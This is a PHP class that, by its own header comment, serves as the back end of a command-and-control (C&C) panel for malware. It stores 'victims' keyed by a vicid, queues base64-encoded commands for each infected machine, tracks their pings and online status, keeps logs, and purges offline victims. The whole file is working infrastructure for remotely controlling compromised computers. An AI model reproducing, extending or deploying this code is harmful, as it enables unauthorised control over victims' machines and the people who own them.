<?php
/*
Class to handle clients and C&C Panel
using HTTP and MySQL
 */
class Clients
{
    private $db;

    public function __construct()
    {
        $this->db = new Database;
    }

    // Create a new client
    public function newClient($clientdata)
    {
        try {
            if ($this->isExist($clientdata['vicid'], "clients")) {
                $this->updateClient($clientdata);
            } else {

                $this->db->query(sprintf("INSERT INTO %s (%s) VALUES (%s)", "clients", implode(", ", array_keys($clientdata)), ":" . implode(",:", array_keys($clientdata))));

                foreach ($clientdata as $key => $value) {
                    $this->db->bind(":" . $key, $value, PDO::PARAM_STR);
                }

                if ($this->db->execute()) {
                    $this->createCommand($clientdata['vicid']);
                    return 'Client Created';
                }
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // Remove a client from the database
    public function removeClient($clientID)
    {
        try {
            $this->removeCommands($clientID);

            $this->db->query("DELETE FROM clients WHERE vicid = :id");

            $this->db->bind(":id", $clientID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return 'Client Removed';
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // update a client
    public function updateClient(array $clientdata)
    {
        try {
            $query = sprintf('UPDATE %s SET ', "clients");
            foreach ($clientdata as $key => $value) {
                $query .= "$key=:$key, ";
            }

            $query = rtrim($query, ", ");
            $query .= sprintf(' WHERE vicid = %s', ":vicid");

            $this->db->query($query);

            foreach ($clientdata as $key => $value) {
                $this->db->bind(":" . $key, $value, PDO::PARAM_STR);
            }

            if ($this->db->execute()) {
                return 'Client Updated';
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // check if a client exist
    public function isExist($clientID, $table_name)
    {
        try {
            $this->db->query(sprintf("SELECT * FROM %s WHERE vicid = :id", $table_name));

            $this->db->bind(':id', $clientID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                if ($this->db->rowCount()) {
                    return true;
                } else {
                    return false;
                }
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // get all clients from database
    public function getClients()
    {
        try {
            $this->db->query("SELECT * FROM clients");
            if ($this->db->execute()) {
                return $this->db->resultset();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // Count all clients
    public function countClients()
    {
        try {
            $this->db->query("SELECT * FROM clients");
            if ($this->db->execute()) {
                return $this->db->rowCount();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // get 1 client from the database using vicid
    public function getClient($vicID)
    {
        try {
            $this->db->query("SELECT * FROM clients WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return $this->db->single();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // count online clients
    public function countClientsByCond($column_name, $cond)
    {
        try {
            $this->db->query(sprintf("SELECT * FROM clients WHERE %s = :cond", $column_name));

            $this->db->bind(":cond", $cond, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return $this->db->rowCount();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // update a client status online/offline
    public function updateStatus($vicID, $status)
    {
        try {
            $this->db->query("UPDATE clients SET status = :status WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);
            $this->db->bind(":status", $status, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return 'Updated';
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function new_log($vicid, $type, $message)
    {
        try {
            $this->db->query("INSERT INTO logs(vicid,type,message) VALUES (:vicid,:type,:message)");

            $this->db->bind(":vicid", $vicid, PDO::PARAM_STR);
            $this->db->bind(":type", $type, PDO::PARAM_STR);
            $this->db->bind(":message", $message, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return 'Log Created';
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function getLogs()
    {
        try {
            $this->db->query("SELECT * FROM logs");

            if ($this->db->execute()) {
                return $this->db->resultset();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }
    public function deleteLog($id)
    {
        try {
            $this->db->query("DELETE FROM logs WHERE id = :id");

            $this->db->bind(":id", $id, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return "Logs deleted";
            }
        } catch (\Throwable $th) {
        }
    }

    // get the last command using vicid
    public function getCommand($vicID)
    {
        try {
            $this->db->query("SELECT * FROM commands WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return $this->db->single();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // update all clients status offline/online
    public function updateAllStatus($status)
    {
        try {
            $this->db->query("UPDATE clients SET status = :status");

            $this->db->bind(":status", $status, PDO::PARAM_STR);

            if ($this->execute()) {
                return "Updated";
            }

        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // create a new command using vicid
    public function createCommand($vicID)
    {
        try {
            if ($this->isExist($vicID, "commands")) {
                $this->updateCommands($vicID, base64_encode("Ping"));
            } else {

                $this->db->query("INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)");

                $this->db->bind(":vicid", $vicID, PDO::PARAM_STR);
                $this->db->bind(":cmd", base64_encode("Ping"), PDO::PARAM_STR);

                if ($this->db->execute()) {
                    return "Command Created";
                }
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function pinged($vicid, $old_pings)
    {
        $pinged_at = date("m/d/Y H:i:s", time());

        $this->db->query("UPDATE clients SET pings = :ping, update_at = :update_at WHERE vicid = :vicid");

        $this->db->bind(":ping", $old_pings + 1, PDO::PARAM_INT);
        $this->db->bind(":update_at", $pinged_at, PDO::PARAM_STR);
        $this->db->bind(":vicid", $vicid, PDO::PARAM_STR);

        if ($this->db->execute()) {
            return "Client Pinged";
        }
    }

    // update a command if a client exist
    public function updateCommands($vicID, $command)
    {
        try {
            $this->db->query("UPDATE commands SET command = :cmd WHERE vicid = :id");

            $this->db->bind(":cmd", $command, PDO::PARAM_STR);
            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return "Command Updated";
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // remove command after uninstalling a client
    public function removeCommands($vicID)
    {
        try {
            $this->db->query("DELETE FROM commands WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return "Command Removed";
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function pingClients()
    {
        try {
            $allclients = $this->getClients();
            foreach ($allclients as $client) {
                if ($this->updateCommands($client->vicid, base64_encode("Ping"))) {
                    $diff = time() - strtotime($client->update_at);
                    $hrs = round($diff / 3600);

                    if ($hrs >= 1) {
                        $this->updateStatus($client->vicid, "Offline");
                    } else {
                        $this->updateStatus($client->vicid, "Online");
                    }
                }
            }
            return true;
        } catch (\Throwable $th) {
            return false;
        }
    }

    public function uninstallOfflineClients()
    {
        try {
            $allclients = $this->getClients();

            foreach ($allclients as $client) {
                if ($client->status === "Offline") {
                    $this->removeClient($client->vicid);
                }
            }
            return true;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }
}
